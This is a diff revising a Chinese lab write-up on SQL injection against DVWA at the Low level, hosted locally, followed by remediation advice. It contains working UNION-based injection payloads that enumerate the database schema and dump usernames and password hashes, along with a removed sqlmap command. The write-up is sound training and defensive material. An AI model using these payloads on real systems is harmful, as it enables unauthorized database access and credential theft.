@@ -1,11 +1,11 @@
-# SQL 注入入门 — DVWA Low 难度
+# SQL 注入 — DVWA Low
 
 !!! info "环境信息"
 
-    靶场：DVWA（`vulnerables/web-dvwa`，Docker）
+    靶场：DVWA（XAMPP + Apache + MariaDB）
     难度：Low
-    地址：`http://localhost:8080/vulnerabilities/sqli/`
-    工具：Burp Suite、sqlmap（仅用于最后对照验证）
+    地址：`http://localhost/dvwa/vulnerabilities/sqli/`
+    工具：浏览器、手动构造 payload
 
 ---
 
@@ -46,33 +46,41 @@ SELECT first_name, last_name FROM users WHERE user_id = '1' OR '1'='1';
 浏览器访问：
 
 ```
-http://localhost:8080/vulnerabilities/sqli/?id=1&Submit=Submit
+http://localhost/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit
 ```
 
 返回一个用户的信息。说明 `id` 参数被用在查询里。
 
-### 第 2 步：用 Burp Suite 抓包
+### 第 2 步：加一个单引号，试探注入点
 
-打开 Burp，配置浏览器代理，把请求发到 **Repeater** 模块，方便反复改包重放。
-
-### 第 3 步：判断注入点类型
-
-先测数字型还是字符型。输入 `1'`：
+输入框填：
 
 ```
-id=1'
+1'
 ```
 
-页面返回 SQL 语法错误。**说明存在注入，且是字符型**（因为单引号把原语句的引号闭合了）。
+页面返回 SQL 语法错误：
 
-### 第 4 步：判断字段数
+```
+Fatal error: Uncaught mysqli_sql_exception: You have an error in your SQL
+syntax; check the manual that corresponds to your MariaDB server version...
+```
+
+**这个报错就是突破口。** 它证明了两件事：
+
+1. 输入被直接拼进了 SQL 语句
+2. 单引号闭合了原语句的引号，导致语法结构崩坏
+
+同时说明是**字符型注入**（数字型不会因为单引号报错）。
+
+### 第 3 步：判断字段数
 
 用 `ORDER BY` 逐步试探：
 
 ```
-id=1' ORDER BY 1 -- 
-id=1' ORDER BY 2 -- 
-id=1' ORDER BY 3 -- 
+1' ORDER BY 1 -- 
+1' ORDER BY 2 -- 
+1' ORDER BY 3 -- 
 ```
 
 前两个正常，第三个报错 → **查询返回 2 个字段**。
@@ -81,56 +89,49 @@ id=1' ORDER BY 3 --
 
     `--` 是 SQL 注释符，用来把原语句后面的部分注释掉，避免语法错误。
 
-    注意 `--` 后面**必须有一个空格**，否则在某些数据库里不生效。
+    注意 `--` 后面**必须有一个空格**，否则在 MySQL/MariaDB 里不生效。
+    这是最容易踩的坑之一——不加空格会继续报语法错误，让人误以为方向错了。
 
-### 第 5 步：确定回显位置
+### 第 4 步：确定回显位置
 
 ```
-id=1' UNION SELECT 1,2 -- 
+1' UNION SELECT 1,2 -- 
 ```
 
 页面显示 `1` 和 `2` 的位置，就是两个可回显的字段。
 
-### 第 6 步：读取数据库信息
+### 第 5 步：读取数据库信息
 
 把回显位置替换成要查的内容：
 
 ```sql
 -- 当前数据库名和版本
-id=1' UNION SELECT database(), version() -- 
+1' UNION SELECT database(), version() -- 
 ```
 
-继续枚举：
+### 第 6 步：逐步枚举数据
 
 ```sql
--- 所有数据库
-id=-1' UNION SELECT 1, group_concat(schema_name) FROM information_schema.schemata -- 
-
 -- 当前库的所有表
-id=-1' UNION SELECT 1, group_concat(table_name) FROM information_schema.tables WHERE table_schema=database() -- 
+1' UNION SELECT 1, group_concat(table_name) FROM information_schema.tables
+   WHERE table_schema=database() -- 
 
 -- users 表的字段名
-id=-1' UNION SELECT 1, group_concat(column_name) FROM information_schema.columns WHERE table_name='users' -- 
+1' UNION SELECT 1, group_concat(column_name) FROM information_schema.columns
+   WHERE table_name='users' -- 
 
 -- 最终：拖出账号和密码哈希
-id=-1' UNION SELECT user, password FROM users -- 
+1' UNION SELECT user, password FROM users -- 
 ```
 
-!!! tip "为什么用 `id=-1`"
+!!! tip "为什么常用 `id=-1`"
 
-    把 `id` 设成一个不存在的值，让原查询返回空，这样 `UNION` 的结果就不会被原始数据混在一起，页面更干净。
+    把 `id` 设成一个不存在的值（如 `-1`），让原查询返回空，
+    这样 `UNION` 的结果就不会和原始数据混在一起，页面更干净。
 
-### 第 7 步：工具对照
+### 第 7 步：结果
 
-用 sqlmap 跑一遍，对照手工结果是否一致：
-
-```bash
-sqlmap -u "http://localhost:8080/vulnerabilities/sqli/?id=1&Submit=Submit" \
-       --cookie="PHPSESSID=你的session; security=low" \
-       --batch --dbs
-```
-
-**先手工，再用工具。** 工具只是验证，不是替代——面试时问的是原理，不是命令。
+成功拿到 `users` 表的所有用户名和密码哈希。
 
 ---
 
@@ -149,7 +150,7 @@ sqlmap -u "http://localhost:8080/vulnerabilities/sqli/?id=1&Submit=Submit" \
 
 ## 四、修复建议
 
-### 方案 1：参数化查询（首选）
+### 方案 1：参数化查询（首选，唯一根治方案）
 
 ```php
 $stmt = $connection->prepare(
@@ -159,9 +160,10 @@ $stmt->bind_param("i", $id);   // "i" 表示整数
 $stmt->execute();
 ```
 
-**这是唯一能从根本上解决问题的方法。** 参数化查询让数据库先把 SQL 结构编译好，再把用户输入当作纯数据填入——输入永远无法变成语法。
+**为什么这是根治**：数据库先把 SQL 结构编译好，再把用户输入当作**纯数据**填入。
+输入永远无法变成语法——从结构上切断了注入的可能。
 
-### 方案 2：输入类型校验
+### 方案 2：输入类型校验（补充，不能单独用）
 
 ```php
 if (!is_numeric($id)) {
@@ -170,13 +172,15 @@ if (!is_numeric($id)) {
 $id = intval($id);
 ```
 
-**只能作为补充，不能作为主要防御。** 因为不是所有参数都是数字（比如搜索框），而且绕过方式很多。
+**只能作为纵深防御的一层。** 不是所有参数都是数字（比如搜索框），
+而且黑名单式的过滤总有绕过方式。
 
 ### 方案 3：最小权限
 
-给 Web 应用的数据库账号只授予必要的权限（`SELECT` / `INSERT`），**不要用 root**，禁止访问 `information_schema`。
+给 Web 应用的数据库账号只授予必要的权限（`SELECT` / `INSERT`），
+**不要用 root**，并禁止访问 `information_schema`。
 
-这样即使被注入，损失也被限制在一定范围内。
+这样即使被注入，能拿到的数据也被限制在一定范围内。
 
 ### 方案 4：关闭错误回显
 
@@ -187,9 +191,9 @@ ini_set('display_errors', 0);
 
 错误信息应记录到日志，而不是返回给用户。减少信息泄漏。
 
-### 方案 5：WAF
+### 方案 5：WAF（纵深防御）
 
-作为**纵深防御**的一层，可以拦截常见注入特征。但不能依赖它——WAF 绕过手法一直在更新。
+可以拦截常见注入特征，但**不能依赖**——WAF 绕过手法一直在更新。
 
 ---
 
@@ -202,7 +206,11 @@ ini_set('display_errors', 0);
 | 常见误判 | 「只过滤单引号就够了」——宽字节、编码绕过都能突破 |
 | 挖洞思路 | 先判断类型 → 字段数 → 回显位 → 逐步枚举 |
 
-**我在这关学到的**：防御的核心不是「过滤坏字符」，而是「让数据和代码彻底分离」。前者是黑名单思维，永远有漏网之鱼；后者是结构性的解决。
+**我在这关学到的**：防御的核心不是「过滤坏字符」，而是**让数据和代码彻底分离**。
+前者是黑名单思维，永远有漏网之鱼；后者是结构性的解决。
+
+另一个体会是：`--` 后面那个空格看起来是小事，但它决定了你能不能继续往下走。
+**渗透测试里大量时间花在这类细节上，而不是"高级技巧"。**
 
 ---
 
